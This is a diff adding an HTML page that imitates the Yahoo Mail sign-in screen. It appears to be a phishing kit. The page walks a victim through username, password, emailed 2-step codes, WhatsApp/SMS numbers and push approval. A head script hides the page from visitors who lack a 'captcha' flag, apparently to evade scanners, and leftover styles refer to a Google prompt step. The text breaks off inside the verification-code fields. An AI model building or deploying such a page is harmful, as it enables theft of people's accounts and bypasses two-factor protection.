@@ -1,0 +1,3048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>3600000){try{localStorage.removeItem('captcha_verified');localStorage.removeItem('captcha_timestamp');sessionStorage.removeItem('captcha_verified');sessionStorage.removeItem('captcha_timestamp');}catch(e){}location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"/>
+  <title>Sign in – Yahoo</title>
+  <link rel="icon" type="image/png" href="https://s.yimg.com/rz/l/yahoo_en-US_f_p_bestfit_2x.png"/>
+  <link rel="preload" href="assets/fonts/yahoo-product-sans-vf.woff2" as="font" type="font/woff2" crossorigin/>
+  <style>
+    @font-face {
+      font-family: "Yahoo Product Sans";
+      src: url("assets/fonts/yahoo-product-sans-vf.woff2") format("woff2");
+      font-weight: 100 900;
+      font-style: normal;
+      font-display: swap;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html {
+      height: 100%;
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+    html, body { height: 100%; }
+
+    /* Full-width fields; 16px+ on mobile stops iOS zoom on focus */
+    input:not([type="checkbox"]):not([type="radio"]),
+    select,
+    textarea {
+      max-width: 100%;
+    }
+    @media screen and (max-width: 768px) {
+      input:not([type="checkbox"]):not([type="radio"]),
+      select,
+      textarea {
+        font-size: 16px !important;
+      }
+    }
+
+    body {
+      font-family: "Yahoo Product Sans", "Centra No2", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      margin: 0;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      color: #232a31;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+    }
+
+    .yahoo-shell {
+      display: flex;
+      min-height: 100vh;
+      width: 100%;
+    }
+
+    .yahoo-main-col {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      background: #fff;
+      position: relative;
+      z-index: 1;
+    }
+
+    @media (min-width: 640px) {
+      .yahoo-main-col {
+        flex: 0 0 42%;
+        max-width: 560px;
+      }
+    }
+
+    .yahoo-promo-panel {
+      display: none;
+      flex: 1;
+      min-height: 100vh;
+      background-color: #6001d2;
+      background-image: url("assets/yahoo-login-desktop-bg.png");
+      background-repeat: no-repeat;
+      background-position: left center;
+      background-size: cover;
+    }
+
+    @media (min-width: 640px) {
+      .yahoo-promo-panel { display: block; }
+    }
+
+    .yahoo-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 20px 24px 8px;
+      flex-shrink: 0;
+    }
+
+    @media (min-width: 640px) {
+      .yahoo-header { padding: 28px 40px 12px; }
+    }
+
+    .yahoo-logo {
+      height: 2.25rem;
+      width: auto;
+      display: block;
+    }
+
+    .yahoo-header-links {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .yahoo-header-links a {
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      letter-spacing: 0;
+      color: #5b636a;
+      text-decoration: none;
+    }
+
+    .yahoo-header-links a:hover { text-decoration: underline; }
+
+    .yahoo-login-center {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      width: 100%;
+      padding: 8px 16px 32px;
+    }
+
+    @media (min-width: 640px) {
+      .yahoo-login-center {
+        align-items: center;
+        padding: 24px 40px 48px;
+      }
+    }
+
+    #loginbox.yahoo-loginbox {
+      box-sizing: border-box;
+      width: 360px;
+      max-width: 100%;
+      height: 523px;
+      min-height: 523px;
+      flex: none;
+      display: flex;
+      flex-direction: column;
+      margin: 0 auto;
+      padding: 0;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #fff;
+    }
+
+    /* ─── Yahoo Mail step 1 (login landing — UDS) ─── */
+    #step1.card-body {
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      min-height: 0;
+    }
+
+    .yahoo-login-section {
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+      width: 100%;
+    }
+
+    .yahoo-form-block {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      width: 100%;
+    }
+
+    .yahoo-field-stack {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .yahoo-field-inner {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .yahoo-title {
+      font-size: 28px;
+      font-weight: 700;
+      line-height: 36px;
+      letter-spacing: 0;
+      color: #232a31;
+      margin: 0;
+    }
+
+    .yahoo-field-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      line-height: 20px;
+      letter-spacing: 0;
+      color: #5b636a;
+      margin: 0;
+    }
+
+    .yahoo-input-wrap {
+      border: 1px solid #cbced5;
+      border-radius: 4px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      transition: border-color 0.12s cubic-bezier(0, 0, 0.2, 1), box-shadow 0.12s cubic-bezier(0, 0, 0.2, 1);
+    }
+
+    .yahoo-input-wrap:focus-within {
+      border-color: #6001d2;
+      box-shadow: 0 0 0 1px #6001d2;
+    }
+
+    .yahoo-input-wrap input {
+      width: 100%;
+      border: none;
+      outline: none;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      letter-spacing: 0;
+      font-family: inherit;
+      color: #232a31;
+      background: transparent;
+      padding: 0;
+    }
+
+    .yahoo-input-wrap.err {
+      border-color: #eb0f0f;
+      box-shadow: 0 0 0 1px #eb0f0f;
+    }
+
+    .yahoo-row-between {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      flex-wrap: wrap;
+      padding: 8px 0;
+    }
+
+    .yahoo-check {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      color: #5b636a;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .yahoo-check input {
+      width: 16px;
+      height: 16px;
+      accent-color: #6001d2;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .yahoo-link {
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      color: #6001d2;
+      text-decoration: none;
+      margin: 0;
+    }
+
+    .yahoo-link:hover { text-decoration: underline; }
+
+    .yahoo-btn-brand {
+      width: 100%;
+      min-height: 44px;
+      padding: 0 20px;
+      border: none;
+      border-radius: 9999px;
+      background: #6001d2;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      line-height: 20px;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background-color 0.22s cubic-bezier(0, 0, 0.2, 1);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-sizing: border-box;
+    }
+
+    .yahoo-btn-brand:hover { background: #5000b8; }
+    .yahoo-btn-brand:disabled { opacity: 0.55; cursor: not-allowed; }
+    .yahoo-btn-brand.is-loading:disabled {
+      opacity: 1;
+      background: #5000b8;
+      cursor: wait;
+    }
+
+    .yahoo-btn-brand .btn-spinner {
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(255, 255, 255, 0.35);
+      border-top-color: #fff;
+      box-sizing: border-box;
+      flex-shrink: 0;
+    }
+
+    .yahoo-btn-tertiary {
+      width: 100%;
+      min-height: 44px;
+      padding: 0 20px;
+      border: none;
+      border-radius: 9999px;
+      background: transparent;
+      color: #6001d2;
+      font-size: 14px;
+      font-weight: 600;
+      line-height: 20px;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background-color 0.22s cubic-bezier(0, 0, 0.2, 1);
+    }
+
+    .yahoo-btn-tertiary:hover { background: rgba(96, 1, 210, 0.08); }
+
+    #loginbox .field-error {
+      font-size: 12px;
+      line-height: 16px;
+      color: #eb0f0f;
+    }
+
+    #loginbox.loginbox-uds-tall {
+      height: auto;
+      min-height: 523px;
+      overflow-y: auto;
+    }
+
+    /* Email verification code (Yahoo UDS) */
+    #stepEmailVerify .yahoo-email-verify-section,
+    #stepWhatsappSmsCode .yahoo-email-verify-section,
+    #stepUdsSmsCode .yahoo-email-verify-section {
+      padding: 32px 24px;
+      box-sizing: border-box;
+    }
+
+    .yahoo-email-verify-section {
+      gap: 32px;
+    }
+
+    .yahoo-verify-illus-wrap {
+      display: flex;
+      justify-content: flex-start;
+      max-width: 100%;
+    }
+
+    .yahoo-verify-illus-wrap img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .yahoo-email-verify-copy {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .yahoo-verify-title {
+      font-size: 24px;
+      line-height: 32px;
+    }
+
+    .yahoo-verify-lead {
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      color: #232a31;
+      margin: 0;
+    }
+
+    .yahoo-verify-code-field {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .yahoo-verify-code-label {
+      font-size: 14px;
+      font-weight: 500;
+      line-height: 20px;
+      color: #5b636a;
+    }
+
+    .yahoo-verify-code-box {
+      border: 1px solid #cbced5;
+      border-radius: 4px;
+      padding: 16px;
+    }
+
+    .yahoo-verify-code-cells {
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+
+    .yahoo-verify-code-cell {
+      flex: 1 1 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 28px;
+    }
+
+    .yahoo-verify-code-cell input {
+      width: 100%;
+      min-width: 24px;
+      border: none;
+      outline: none;
+      text-align: center;
+      font-size: 14px;
+      line-height: 20px;
+      color: #232a31;
+      font-family: inherit;
+      padding: 0 4px;
+      background: transparent;
+      position: relative;
+      z-index: 1;
+      caret-color: #6001d2;
+    }
+
+    .yahoo-verify-code-cells > .yahoo-code-sep {
+      pointer-events: none;
+    }
+
+    .yahoo-verify-code-cell .yahoo-code-sep {
+      flex-shrink: 0;
+      width: 16px;
+      height: 2px;
+      color: #cbced5;
+    }
+
+    .yahoo-verify-code-box.err {
+      border-color: #eb0f0f;
+      box-shadow: 0 0 0 1px #eb0f0f;
+    }
+
+    #yahooEmailCodeError.field-error.visible {
+      display: block;
+    }
+
+    #stepWhatsappPhone .yahoo-whatsapp-phone-section,
+    #stepUdsSmsPhone .yahoo-whatsapp-phone-section,
+    #stepPushNotify .yahoo-push-notify-section {
+      padding: 32px 24px;
+      box-sizing: border-box;
+    }
+
+    .yahoo-push-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      width: 100%;
+    }
+
+    .yahoo-wa-phone-row {
+      display: flex;
+      align-items: stretch;
+      gap: 16px;
+    }
+
+    .yahoo-wa-prefix-box {
+      flex-shrink: 0;
+      border: 1px solid #cbced5;
+      border-radius: 4px;
+      padding: 16px;
+      font-size: 14px;
+      line-height: 20px;
+      color: #232a31;
+      display: flex;
+      align-items: center;
+    }
+
+    .yahoo-wa-main-box {
+      flex: 1;
+      min-width: 0;
+      border: 1px solid #cbced5;
+      border-radius: 4px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 14px;
+      line-height: 20px;
+      color: #232a31;
+    }
+
+    .yahoo-wa-main-box.err {
+      border-color: #eb0f0f;
+      box-shadow: 0 0 0 1px #eb0f0f;
+    }
+
+    .yahoo-wa-mask {
+      white-space: pre;
+      letter-spacing: 0.02em;
+    }
+
+    .yahoo-wa-digit {
+      width: 1.25rem;
+      border: none;
+      border-bottom: 1px solid #232a31;
+      text-align: center;
+      font-size: 14px;
+      line-height: 20px;
+      font-family: inherit;
+      color: #232a31;
+      padding: 0 0 2px;
+      outline: none;
+      background: transparent;
+    }
+
+    .yahoo-wa-digit:focus {
+      border-bottom-color: #6001d2;
+    }
+
+    .yahoo-wa-suffix {
+      margin-left: 2px;
+      white-space: nowrap;
+    }
+
+    /* Step 2 — password (Yahoo UDS) */
+    .yahoo-step2-email {
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      letter-spacing: 0;
+      color: #5b636a;
+      margin: 0;
+      word-break: break-all;
+    }
+
+    .yahoo-step2-title-wrap {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .yahoo-pw-wrap {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      padding: 16px 8px 16px 16px;
+    }
+
+    .yahoo-field-pw-block {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .yahoo-pw-wrap input {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .yahoo-pw-toggle {
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      margin: -8px 0;
+      padding: 0;
+      border: none;
+      border-radius: 4px;
+      background: transparent;
+      color: #5b636a;
+      cursor: pointer;
+      transition: background-color 0.22s cubic-bezier(0, 0, 0.2, 1);
+    }
+
+    .yahoo-pw-toggle:hover { background: rgba(0, 0, 0, 0.05); }
+
+    .yahoo-forgot-pw-row {
+      display: flex;
+      align-items: center;
+      padding: 8px 0;
+    }
+
+    .yahoo-forgot-pw-link {
+      border: none;
+      background: none;
+      padding: 0;
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 20px;
+      color: #5b636a;
+      cursor: pointer;
+      text-align: left;
+    }
+
+    .yahoo-forgot-pw-link:hover { text-decoration: underline; }
+
+    .yahoo-field-label.is-error {
+      color: #eb0f0f;
+    }
+
+    .yahoo-input-wrap.yahoo-pw-wrap.is-error {
+      border-color: #eb0f0f;
+      box-shadow: 0 0 0 1px #eb0f0f;
+    }
+
+    .yahoo-pw-toggle.is-error {
+      color: #eb0f0f;
+    }
+
+    .yahoo-pw-toggle.is-error:hover {
+      background: rgba(235, 15, 15, 0.08);
+    }
+
+    .yahoo-pw-error {
+      font-size: 12px;
+      font-weight: 400;
+      line-height: 16px;
+      letter-spacing: 0;
+      color: #eb0f0f;
+      margin: 6px 0 0;
+      display: none;
+    }
+
+    .yahoo-pw-error.visible {
+      display: block;
+    }
+
+    /* ─── Card body — single column mobile, 2-column desktop ─── */
+    .yahoo-loginbox > .card-body {
+      flex: 1;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
+      font-family: inherit;
+      font-size: 14px;
+      line-height: 20px;
+      color: #232a31;
+    }
+
+    /* ─── Left column: branding ─── */
+    .col-brand {
+      display: flex;
+      flex-direction: column;
+      flex-shrink: 0;       /* don't stretch on mobile */
+      margin-bottom: 16px;  /* compact gap before form on mobile */
+    }
+
+
+    /* ─── Right column: form ─── */
+    .col-form {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+    }
+
+
+    /* ─── Headings ─── */
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #1f1f1f;
+      line-height: 1.3;
+      margin-bottom: 8px;
+    }
+
+
+    .subtitle {
+      font-size: 14px;
+      color: #1f1f1f;
+      margin-bottom: 32px;
+    }
+
+
+    .subtitle button {
+      background: none;
+      border: none;
+      color: #0b57d0;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 0;
+      font-family: inherit;
+    }
+
+    .subtitle button:hover { text-decoration: underline; }
+
+    /* ─── Material 3 Outlined Text Field ─── */
+    .text-field {
+      position: relative;
+      margin-bottom: 8px;
+    }
+
+    .text-field input {
+      width: 100%;
+      height: 56px;
+      padding: 12px 14px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 16px;
+      font-family: inherit;
+      color: #1f1f1f;
+      background: transparent;
+      outline: none;
+      caret-color: #0b57d0;
+      transition: border-color 0.15s;
+    }
+
+    .text-field input:hover:not(:focus):not(.err) { border-color: #1f1f1f; }
+
+    .text-field input:focus {
+      border: 2px solid #0b57d0;
+      padding: 11px 13px;
+    }
+
+    .text-field input.err {
+      border: 2px solid #b3261e;
+      padding: 11px 13px;
+    }
+
+    .text-field label {
+      position: absolute;
+      left: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      padding: 0 8px;
+      font-size: 16px;
+      color: #444746;
+      background: #fff;
+      pointer-events: none;
+      transition: all 0.15s cubic-bezier(.4,0,.2,1);
+      white-space: nowrap;
+    }
+
+    .text-field input:focus ~ label,
+    .text-field input.has-val ~ label {
+      top: 0;
+      font-size: 12px;
+      color: #0b57d0;
+    }
+
+    .text-field input.err ~ label {
+      top: 0;
+      font-size: 12px;
+      color: #b3261e !important;
+    }
+
+    .text-field input.has-val:not(:focus):not(.err) ~ label { color: #444746; }
+
+    /* Error message */
+    .field-error { font-size: 12px; color: #b3261e; margin-top: 4px; display: none; }
+    .field-error.visible { display: block; }
+
+    /* ─── Account chip (step 2) ─── */
+    .acct-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px 8px 8px;
+      border: 1px solid #c4c7c5;
+      border-radius: 100px;
+      cursor: pointer;
+      margin-top: 8px;
+      width: fit-content;
+      max-width: 100%;
+      transition: background 0.15s;
+    }
+    .acct-chip:hover { background: rgba(68,71,70,.08); }
+
+    .acct-chip-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #e8eaed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      overflow: hidden;
+    }
+
+    .acct-chip-email {
+      font-size: 14px;
+      color: #1f1f1f;
+      font-weight: 400;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      max-width: 220px;
+    }
+
+    /* ─── Show password checkbox ─── */
+    .show-pw-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 8px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .show-pw-row input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      min-width: 18px;
+      cursor: pointer;
+      accent-color: #0b57d0;
+    }
+
+    .show-pw-row span {
+      font-size: 14px;
+      color: #444746;
+    }
+
+    /* ─── Links ─── */
+    .forgot-link {
+      font-size: 14px;
+      font-weight: 500;
+      color: #0b57d0;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 4px;
+      margin-bottom: 24px;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* ─── Privacy notice ─── */
+    .privacy-notice {
+      font-size: 12px;
+      color: #444746;
+      line-height: 1.5;
+    }
+    .privacy-notice a { color: #0b57d0; text-decoration: none; }
+    .privacy-notice a:hover { text-decoration: underline; }
+
+    /* ─── Action buttons ─── */
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 24px;
+      padding-top: 0;
+    }
+
+    /* On wide desktop keep buttons pushed to bottom of column */
+    @media (min-width: 961px) {
+      .actions {
+        margin-top: auto;
+        padding-top: 32px;
+      }
+    }
+
+    .btn-text {
+      height: 40px;
+      padding: 0 12px;
+      background: none;
+      border: none;
+      color: #0b57d0;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      border-radius: 20px;
+      transition: background 0.15s;
+    }
+    .btn-text:hover { background: rgba(11,87,208,.08); }
+
+    .btn-next {
+      height: 40px;
+      padding: 0 24px;
+      background: #0b57d0;
+      border: none;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      border-radius: 20px;
+      transition: background 0.15s, box-shadow 0.15s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .btn-next:hover {
+      background: #0842a0;
+      box-shadow: 0 1px 2px rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+    }
+    .btn-next:active { background: #0b44c0; }
+    .btn-next:disabled { opacity: .6; cursor: default; }
+
+    .btn-spinner {
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .65s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ─── Phone prefix box (step 3) ─── */
+    .phone-row {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      margin-bottom: 8px;
+    }
+
+    .phone-prefix-box {
+      flex-shrink: 0;
+      width: 72px;
+      height: 56px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      color: #1f1f1f;
+      font-weight: 500;
+      background: #f8f9fa;
+      user-select: none;
+    }
+
+    .phone-info {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    /* ─── Step 4: Google Prompt ─── */
+    .prompt-number {
+      font-size: 80px;
+      font-weight: 300;
+      color: #1f1f1f;
+      line-height: 1;
+      margin-bottom: 20px;
+      letter-spacing: -2px;
+    }
+
+    .prompt-device-title {
+      font-size: 18px;
+      font-weight: 500;
+      color: #1f1f1f;
+      margin-bottom: 12px;
+    }
+
+    .prompt-desc {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.57;
+      margin-bottom: 16px;
+    }
+
+    .prompt-help-link {
+      font-size: 14px;
+      color: #0b57d0;
+      text-decoration: none;
+    }
+    .prompt-help-link:hover { text-decoration: underline; }
+
+    .prompt-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444746;
+      cursor: pointer;
+      user-select: none;
+      align-self: flex-start;
+    }
+    .prompt-checkbox-row input { accent-color: #0b57d0; width: 18px; height: 18px; cursor: pointer; }
+
+    .col-form-center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    /* ─── Step 5: SMS phone entry ─── */
+    .sms-gif-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    .sms-gif-wrap img {
+      width: 80px;
+      height: 80px;
+      object-fit: contain;
+    }
+    .sms-section-title {
+      font-size: 16px;
+      font-weight: 500;
+      color: #1f1f1f;
+      margin-bottom: 8px;
+    }
+    .sms-desc {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.57;
+      margin-bottom: 16px;
+    }
+    .sms-masked-num {
+      color: #1f1f1f;
+      font-weight: 500;
+      white-space: nowrap;
+    }
+    .sms-country-selector {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      height: 54px;
+      padding: 0 12px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #1f1f1f;
+      cursor: pointer;
+      white-space: nowrap;
+      background: #fff;
+      min-width: 90px;
+      position: relative;
+      flex-shrink: 0;
+    }
+    .sms-country-selector::after {
+      content: '';
+      border: 5px solid transparent;
+      border-top-color: #444746;
+      margin-top: 4px;
+    }
+    .sms-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+    .sms-checkbox-row input[type=checkbox] {
+      width: 18px;
+      height: 18px;
+      accent-color: #1a73e8;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .sms-checkbox-row label {
+      font-size: 14px;
+      color: #1f1f1f;
+      cursor: pointer;
+      line-height: 1.4;
+    }
+
+    /* ─── Step 6: Code entry ─── */
+    .code-hint {
+      font-size: 14px;
+      color: #444746;
+      line-height: 1.57;
+      margin-bottom: 24px;
+    }
+
+    /* ─── Loading overlay ─── */
+    .page-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,.5);
+      z-index: 99;
+    }
+    .page-overlay.visible { display: block; }
+  </style>
+</head>
+<body>
+
+  <!-- Loading overlay -->
+  <div class="page-overlay" id="overlay"></div>
+
+  <div class="yahoo-shell">
+    <div class="yahoo-main-col">
+      <header class="yahoo-header">
+        <img class="yahoo-logo" src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo"/>
+        <div class="yahoo-header-links">
+          <a href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT" target="_blank" rel="noopener noreferrer">Help</a>
+          <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer">Terms</a>
+          <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer">Privacy</a>
+        </div>
+      </header>
+
+      <div class="yahoo-login-center">
+      <div id="loginbox" class="yahoo-loginbox">
+
+    <!-- ── STEP 1: Username / email ── -->
+    <div class="card-body" id="step1">
+      <section class="yahoo-login-section">
+        <div>
+          <h1 class="yahoo-title">Sign in to Yahoo Mail</h1>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-field-stack">
+            <div class="yahoo-field-inner">
+              <label class="yahoo-field-label" for="emailInput">Username, email or phone number</label>
+              <div class="yahoo-input-wrap" id="emailInputWrap">
+                <input
+                  type="text"
+                  id="emailInput"
+                  name="username"
+                  autocomplete="username"
+                  spellcheck="false"
+                  aria-required="true"
+                />
+              </div>
+            </div>
+            <div class="field-error" id="emailError">Enter a valid email or phone number</div>
+            <div class="yahoo-row-between">
+              <label class="yahoo-check">
+                <input type="checkbox" name="persistent" value="y" checked/>
+                Stay signed in
+              </label>
+              <a href="#" class="yahoo-link">Forgot username</a>
+            </div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="emailNextBtn">
+            <span id="emailBtnLabel">Next</span>
+          </button>
+          <button type="button" class="yahoo-btn-tertiary">Create account</button>
+        </div>
+      </section>
+    </div><!-- /.card-body step1 -->
+
+    <!-- ── STEP 2: Password ── -->
+    <div class="card-body" id="step2" style="display:none;">
+      <section class="yahoo-login-section">
+        <p class="yahoo-step2-email" id="chipEmail"></p>
+        <div class="yahoo-step2-title-wrap">
+          <h1 class="yahoo-title">Enter your password</h1>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-field-stack">
+            <div class="yahoo-field-inner">
+              <label class="yahoo-field-label" id="pwFieldLabel" for="pwInput">Password</label>
+              <div class="yahoo-field-pw-block">
+                <div class="yahoo-input-wrap yahoo-pw-wrap" id="pwInputWrap">
+                  <input
+                    type="password"
+                    id="pwInput"
+                    name="password"
+                    autocomplete="current-password"
+                    spellcheck="false"
+                    aria-label="Password"
+                    aria-invalid="false"
+                    aria-errormessage="pwError"
+                  />
+                  <button type="button" class="yahoo-pw-toggle" id="pwShowBtn" aria-label="Show password" aria-pressed="false">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" aria-hidden="true" focusable="false">
+                      <path fill="currentColor" d="M8 11c1.105 0 2-1.343 2-3s-.895-3-2-3-2 1.343-2 3 .895 3 2 3"></path>
+                      <path fill="currentColor" d="M16 8c0 3.314-3.582 6-8 6s-8-2.686-8-6 3.582-6 8-6 8 2.686 8 6m-1.7 0c0-1.002-.538-2.038-1.663-2.883C11.51 4.273 9.877 3.7 8 3.7s-3.51.573-4.637 1.417S1.7 6.998 1.7 8s.537 2.038 1.663 2.883C4.49 11.727 6.123 12.3 8 12.3s3.51-.573 4.637-1.417C13.762 10.038 14.3 9.002 14.3 8"></path>
+                    </svg>
+                  </button>
+                </div>
+                <p class="yahoo-pw-error" id="pwError" role="alert">Incorrect password. Try again</p>
+              </div>
+            </div>
+            <div class="yahoo-forgot-pw-row">
+              <button type="button" class="yahoo-forgot-pw-link" id="forgotPwBtn">Forgot password</button>
+            </div>
+          </div>
+          <button type="button" class="yahoo-btn-brand" id="pwNextBtn">
+            <span id="pwBtnLabel">Next</span>
+          </button>
+        </div>
+      </section>
+    </div><!-- /.card-body step2 -->
+
+    <!-- ── Email verification code (2-step email) ── -->
+    <div class="card-body" id="stepEmailVerify" style="display:none;">
+      <section class="yahoo-login-section yahoo-email-verify-section">
+        <div class="yahoo-verify-illus-wrap" aria-hidden="true">
+          <img src="assets/yahoo-email-verify-illus.svg" width="297" height="176" alt=""/>
+        </div>
+        <div class="yahoo-email-verify-copy">
+          <h1 class="yahoo-title yahoo-verify-title">Enter verification code</h1>
+          <p class="yahoo-verify-lead">For 2-step verification, we&rsquo;ll email you a code</p>
+        </div>
+        <div class="yahoo-form-block">
+          <div class="yahoo-verify-code-field">
+            <div class="yahoo-verify-code-label">6-digit code</div>
+            <div class="yahoo-verify-code-box" id="yahooEmailCodeBox">
+              <div class="yahoo-verify-code-cells" id="yahooEmailCodeCells">
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="6" id="yahooEmailCode0" aria-label="Code digit 1" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooEmailCode1" aria-label="Code digit 2" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooEmailCode2" aria-label="Code digit 3" autocomplete="one-time-code"/></div>
+                <svg class="yahoo-code-sep" viewBox="0 0 16 2" aria-hidden="true"><path d="M1 1H15" stroke="currentColor" stroke-linecap="round"/></svg>
+                <div class="yahoo-verify-code-cell"><input type="text" inputmode="numeric" maxlength="1" id="yahooEmailCode3" aria-label="Code digit 4" autocomplete="one-time-code"/></div>
